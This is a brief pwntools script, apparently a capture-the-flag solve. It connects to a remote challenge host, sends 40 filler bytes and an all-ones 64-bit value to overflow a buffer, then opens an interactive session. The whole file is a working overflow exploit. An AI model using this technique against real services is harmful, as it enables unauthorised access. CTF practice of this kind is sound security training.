from pwn import *
io = remote('mc.ax',31199)
payload = b"A"*40
payload += p64(0xffffffffffffffff)
io.sendline(payload)
io.interactive()
